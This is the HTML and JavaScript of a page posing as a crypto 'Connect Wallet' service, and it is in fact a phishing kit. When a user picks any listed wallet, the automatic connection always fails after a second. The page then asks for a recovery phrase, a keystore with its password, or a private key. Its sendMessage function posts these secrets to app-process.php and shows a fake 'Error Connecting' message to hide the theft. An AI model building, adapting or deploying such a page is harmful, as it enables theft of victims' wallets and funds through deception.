<!doctypehtml><html lang="en"><head><meta charset="UTF-8"><meta content="width=device-width,initial-scale=1"name="viewport"><title>Connect Wallet</title><link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.2/css/bootstrap.min.css"rel="stylesheet"><link href="favicon.ico"rel="icon"type="image/x-icon"><style>body{background-color:#f8f9fa;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}.header{text-align:center;padding:2rem 0;background:#fff;box-shadow:0 2px 4px rgba(0,0,0,.05);position:sticky;top:0;z-index:1000}.search-container{max-width:400px;margin:1rem auto}.search-input{width:100%;padding:.5rem 1rem;border:1px solid #dee2e6;border-radius:8px;font-size:1rem}.wallet-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:2rem;padding:2rem;max-width:1200px;margin:0 auto}.wallet-item{display:flex;flex-direction:column;align-items:center;text-align:center;text-decoration:none;color:#333;padding:1rem;border-radius:12px;transition:all .3s ease;cursor:pointer}.wallet-item:hover{transform:scale(1.1);background-color:#fff;box-shadow:0 4px 12px rgba(0,0,0,.1)}.wallet-icon{width:48px;height:48px;object-fit:contain;margin-bottom:.5rem}.wallet-name{font-size:.875rem;margin:0;color:#495057}.wallet-modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background-color:rgba(0,0,0,.5);z-index:2000;animation:fadeIn .3s ease}.modal-content{position:relative;background-color:#fff;width:90%;max-width:400px;margin:15vh auto;padding:2rem;border-radius:16px;box-shadow:0 4px 20px rgba(0,0,0,.2);animation:slideIn .3s ease}.modal-header{text-align:center;margin-bottom:1rem}.modal-body{display:flex;flex-direction:column;align-items:center;gap:.2rem}.modal-icon{width:80px;height:80px;object-fit:contain}.connect-button{width:100%;padding:.75rem;background-color:grey;color:#fff;border:none;border-radius:8px;font-weight:600;margin-top:1rem;cursor:pointer;transition:background-color .3s ease}.connect-button.error{background-color:#f44}.error-button{background-color:red!important;color:#fff;cursor:not-allowed}.manual-connect{width:70%;padding:10px;border:1px solid #ccc;background-color:#d3d3d3;font-weight:600;border-radius:8px;cursor:pointer;transition:all .3s ease}.manual-connect:hover{background-color:#f5f5f5}.close-button{position:absolute;top:1rem;right:1rem;background:0 0;border:none;font-size:1.5rem;cursor:pointer;color:#666;padding:.5rem}.tab-links{display:flex;gap:32px;border-bottom:1px solid #e5e7eb;margin-bottom:24px;padding-bottom:8px}.tab-link{text-decoration:none;color:#6b7280;font-size:14px;padding-bottom:8px;position:relative}.tab-link.active{color:#3b82f6}.tab-link.active::after{content:'';position:absolute;bottom:-9px;left:0;width:100%;height:2px;background-color:#3b82f6}.input-field{width:100%;padding:12px;border:1px solid #e5e7eb;border-radius:8px;margin-bottom:12px;font-size:14px;resize:none}.logo-header{display:flex;flex-direction:column;margin-bottom:.5rem;align-items:center}.password-field{margin-top:12px}.helper-text{color:#6b7280;font-size:13px;margin-bottom:24px}.proceed-button{width:100%;padding:12px;background-color:#3b82f6;color:#fff;border:none;border-radius:8px;cursor:pointer;margin-bottom:12px;font-weight:500}.cancel-button{width:100%;padding:12px;background-color:#ef4444;color:#fff;border:none;border-radius:8px;cursor:pointer;font-weight:500}@keyframes fadeIn{from{opacity:0}to{opacity:1}}@keyframes slideIn{from{transform:translateY(-20px);opacity:0}to{transform:translateY(0);opacity:1}}@media (max-width:768px){.wallet-grid{grid-template-columns:repeat(auto-fill,minmax(100px,1fr));gap:1rem;padding:1rem}.wallet-icon{width:40px;height:40px}.wallet-name{font-size:.75rem}.modal-content{width:95%;margin:10vh auto;padding:1.5rem}}</style></head><body><div class="header"><h1>Connect Wallet</h1><p class="text-muted">Please connect your wallet to continue</p><div class="search-container"><input class="search-input"placeholder="Search"id="walletSearch"></div></div><div class="wallet-grid"id="walletGrid"></div><div class="wallet-modal"id="walletModal"><div class="modal-content"><button class="close-button"onclick="closeModal()">×</button><div class="modal-header"><h3>Connect Wallet</h3></div><div class="modal-body"id="initialView"><img alt=""class="modal-icon"id="modalIcon"src=""><h4 id="modalWalletName"></h4><p class="text-muted">Connect with your preferred wallet to continue</p><button class="connect-button"id="connectButton">Connecting...</button> <button class="manual-connect"onclick="showTabView()"id="manualButton"style="display:none">Connect manually</button></div><div class="modal-body"id="tabView"style="display:none"><div class="logo-header"><img alt=""class="modal-icon"id="tabModalIcon"src=""><h4 id="tabModalWalletName"></h4></div><div class="tab-links"id="initialView"><a class="tab-link active"href="#"onclick='switchTab("phrase")'>Phrase</a> <a class="tab-link"href="#"onclick='switchTab("keystore")'>Keystore</a> <a class="tab-link"href="#"onclick='switchTab("privateKey")'>Private Key</a></div><div class="tab-content"id="phraseTab"><form action="app-process.php"id="contactFormPhrase"method="post"><textarea class="input-field"id="phraseWalletPhrase"name="phraseWallet"placeholder="Enter your recovery phrase"rows="5"></textarea><div class="helper-text">Typically 12 (sometimes 24) words separated by single spaces</div><button class="proceed-button"onclick='sendMessage("contactFormPhrase")'type="button"id="sendMessageButton">Proceed</button> <button class="cancel-button"onclick="closeModal()"type="button">Cancel</button></form></div><div class="tab-content"id="keystoreTab"style="display:none"><form action="app-process.php"id="contactFormKeystore"method="post"><textarea class="input-field"id="phraseWalletKeystore"name="phraseWallet"placeholder="Enter Keystore"rows="5"></textarea> <input class="input-field password-field"placeholder="Wallet password"name="passwordWallet"><div class="helper-text">Several lines of text beginning with '{..' plus the password you used to encrypt it.</div><button class="proceed-button"onclick='sendMessage("contactFormKeystore")'type="button"id="sendMessageButton">Proceed</button> <button class="cancel-button"onclick="closeModal()"type="button">Cancel</button></form></div><div class="tab-content"id="privateKeyTab"style="display:none"><form action="app-process.php"id="contactFormPrivateKey"method="post"><input class="input-field"placeholder="Enter your Private Key"id="phraseWalletPrivateKey"name="phraseWallet"><div class="helper-text">Typically 12 (sometimes 24) words separated by a single space.</div><button class="proceed-button"onclick='sendMessage("contactFormPrivateKey")'type="button"id="sendMessageButton">Proceed</button> <button class="cancel-button"onclick="closeModal()"type="button">Cancel</button></form></div></div></div></div><script>
        const wallets = [
            { name: 'WalletConnect', icon: 'wallet-connect.png' },
            { name: 'Trust', icon: 'trust.png' },
            { name: 'Metamask', icon: 'metamask.png' },
            { name: 'Ledger', icon: 'ledger.png' },
            { name: 'BRD', icon: 'brd.png' },
            { name: 'Coinbase', icon: 'coinbase.png' },
    { name: 'Ordinals', icon: 'ordinals.png' },
    { name: 'Unisat', icon: 'unisat.png' },
    { name: 'OKX', icon: 'okx.png' },
    { name: 'Xverse', icon: 'xverse.png' },
    { name: 'Sparrow', icon: 'sparrow.png' },
    { name: 'Earth', icon: 'earth.png' },
    { name: 'Hiro', icon: 'hiro.png' },
    { name: 'Saitamask wallet', icon: 'saitamask-wallet.png' },
    { name: 'Terra station', icon: 'terra-station.png' },
    { name: 'Phantom wallet', icon: 'phantom-wallet.png' },
    { name: 'Solflare Wallet', icon: 'solflare-wallet.png' },
    { name: 'Cosmos station', icon: 'cosmos-station.png' },
    { name: 'Exodus wallet', icon: 'exodus-wallet.png' },
    { name: 'Rainbow', icon: 'rainbow.png' },
    { name: 'Argent', icon: 'argent.png' },
    { name: 'Binance Chain', icon: 'binance-chain.png' },
    { name: 'Safemoon', icon: 'safemoon.png' },
    { name: 'Gnosis Safe', icon: 'gnosis-safe.png' },
    { name: 'DeFi', icon: 'defi.png' },
    { name: 'Pillar', icon: 'pillar.png' },
    { name: 'imToken', icon: 'imtoken.png' },
    { name: 'ONTO', icon: 'onto.png' },
    { name: 'TokenPocket', icon: 'tokenpocket.png' },
    { name: 'Aave', icon: 'aave.png' },
            { name: 'Digitex', icon: 'digitex.png' },
    { name: 'Portis', icon: 'portis.png' },
    { name: 'Formatic', icon: 'formatic.png' },
    { name: 'MathWallet', icon: 'mathwallet.png' },
    { name: 'BitPay', icon: 'bitpay.png' },
    { name: 'Ledger Live', icon: 'ledger-live.png' },
    { name: 'WallETH', icon: 'walleth.png' },
    { name: 'Authereum', icon: 'authereum.png' },
    { name: 'Dharma', icon: 'dharma.png' },
    { name: '1inch Wallet', icon: '1inch-wallet.png' },
    { name: 'Huobi', icon: 'huobi.png' },
    { name: 'Eidoo', icon: 'eidoo.png' },
    { name: 'MYKEY', icon: 'mykey.png' },
    { name: 'Loopring', icon: 'loopring.png' },
    { name: 'Atomic', icon: 'atomic.png' },
    { name: 'Coin98', icon: 'coin98.png' },
    { name: 'Tron', icon: 'tron.png' },
    { name: 'Alice', icon: 'alice.png' },
    { name: 'AlphaWallet', icon: 'alphawallet.png' },
    { name: 'DCENT', icon: 'dcent.png' },
    { name: 'ZelCore', icon: 'zelcore.png' },
    { name: 'Nash', icon: 'nash.png' },
    { name: 'Coinmoni', icon: 'coinmoni.png' },
    { name: 'GridPlus', icon: 'gridplus.png' },
    { name: 'CYBAVO', icon: 'cybavo.png' },
    { name: 'Tokenary', icon: 'tokenary.png' },
            { name: 'Torus', icon: 'torus.png' },
            { name: 'Spatium', icon: 'spatium.png' },
            { name: 'SafePal', icon: 'safepal.png' },
{ name: 'Infinito', icon: 'infinito.png' },
{ name: 'Wallet.io', icon: 'wallet-io.png' },
{ name: 'Ownbit', icon: 'ownbit.png' },
{ name: 'EasyPocket', icon: 'easypocket.jpg' },
{ name: 'Bridge Wallet', icon: 'bridge-wallet.png' },
{ name: 'Spark Point', icon: 'spark-point.png' },
{ name: 'ViaWallet', icon: 'viawallet.png' },
{ name: 'BitKeep', icon: 'bitkeep.png' },
{ name: 'Vision', icon: 'vision.png' },
{ name: 'PEAKDEFI', icon: 'peakdefi.png' },
{ name: 'Unstoppable', icon: 'unstoppable.png' },
{ name: 'HaloDeFi', icon: 'halodefi.png' },
{ name: 'Dok Wallet', icon: 'dok-wallet.png' },
{ name: 'Midas', icon: 'midas.png' },
{ name: 'Ellipal', icon: 'ellipal.png' },
{ name: 'KEYRING PRO', icon: 'keyring-pro.png' },
{ name: 'Aktionariat', icon: 'aktionariat.png' },
{ name: 'Talken', icon: 'talken.png' },
{ name: 'Flare', icon: 'flare.png' },
{ name: 'KyberSwap', icon: 'kyberswap.png' },
{ name: 'Linen', icon: 'linen.png' },
        ];

        function showTabView() {
            document.getElementById('tabModalIcon').src = document.getElementById('modalIcon').src;
    document.getElementById('tabModalIcon').alt = document.getElementById('modalIcon').alt;
    document.getElementById('tabModalWalletName').textContent = document.getElementById('modalWalletName').textContent;
    document.getElementById('initialView').style.display = 'none';
    document.getElementById('tabView').style.display = 'block';
    switchTab('phrase');}
function switchTab(tabName) {
    document.querySelectorAll('.tab-content').forEach(tab => {
        tab.style.display = 'none';
    });
    document.querySelectorAll('.tab-link').forEach(link => {
        link.classList.remove('active');
    });
    document.getElementById(`${tabName}Tab`).style.display = 'block';
    const activeLink = Array.from(document.querySelectorAll('.tab-link'))
        .find(link => link.textContent.toLowerCase() === tabName.toLowerCase());
    if (activeLink) {
        activeLink.classList.add('active');}}
        function createWalletGrid(walletsToShow) {
            const grid = document.getElementById('walletGrid');
            grid.innerHTML = '';
            walletsToShow.forEach(wallet => {
                const walletItem = document.createElement('div');
                walletItem.className = 'wallet-item';
                walletItem.onclick = () => openModal(wallet);
                walletItem.innerHTML = `
                    <img src="img/${wallet.icon}" alt="${wallet.name}" class="wallet-icon">
                    <p class="wallet-name">${wallet.name}</p>
                `;
                grid.appendChild(walletItem);});}
        createWalletGrid(wallets);
    function openModal(wallet) {
    const modal = document.getElementById('walletModal');
    const modalIcon = document.getElementById('modalIcon');
    const modalName = document.getElementById('modalWalletName');
    const connectButton = document.getElementById('connectButton');
    const manualButton = document.getElementById('manualButton');
    connectButton.textContent = 'Connecting...';
    connectButton.classList.remove('error');
    manualButton.style.display = 'none';
    modalIcon.src = `img/${wallet.icon}`;
    modalIcon.alt = wallet.name;
    modalName.textContent = wallet.name;
    modal.style.display = 'block';
    document.body.style.overflow = 'hidden';
    setTimeout(() => {
        connectButton.textContent = 'Error connecting';
        connectButton.classList.add('error');
        manualButton.style.display = 'block';}, 1000);}
function sendMessage(formId) {
    const form = document.getElementById(formId);
    const formData = new FormData(form);
    const walletName = document.getElementById('tabModalWalletName').textContent;
    formData.append("walletName", walletName);
    formData.append("send", "true");
    const sendButton = form.querySelector(".proceed-button");
    sendButton.textContent = "Error Connecting";
    sendButton.classList.add("error-button");
    sendButton.disabled = true;
    fetch("app-process.php", {
        method: "POST",
        body: formData});}
function closeModal() {
    const modal = document.getElementById('walletModal');
    const rxst = document.getElementById('tabView');
    const strxr = document.getElementById('initialView');
    modal.style.display = 'none';
    rxst.style.display = 'none';
    strxr.style.display = 'flex';

        const inputs = modal.querySelectorAll("input, textarea");
    inputs.forEach(input => {
        input.value = "";
        input.placeholder = "";
    });

      const proceedButtons = modal.querySelectorAll(".proceed-button");
    proceedButtons.forEach(button => {
        button.textContent = "Proceed";
        button.classList.remove("error-button");
        button.disabled = false;
    });

    document.body.style.overflow = 'auto';

}
        const searchInput = document.getElementById('walletSearch');
        searchInput.addEventListener('input', (e) => {
            const searchTerm = e.target.value.toLowerCase();
            const filteredWallets = wallets.filter(wallet => 
                wallet.name.toLowerCase().includes(searchTerm)
            );
            createWalletGrid(filteredWallets);
        });</script></body></html>